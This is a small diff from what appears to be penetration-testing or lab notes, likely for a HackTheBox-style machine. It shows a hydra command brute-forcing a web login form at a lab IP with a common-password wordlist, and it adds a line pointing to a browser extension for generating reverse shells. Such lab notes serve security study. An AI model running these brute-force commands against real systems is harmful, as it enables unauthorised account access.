@@ -41,3 +41,5 @@ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k
 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"
 
 ```
+
+Yuo can use the extension of hacktoools for generating reverse shells
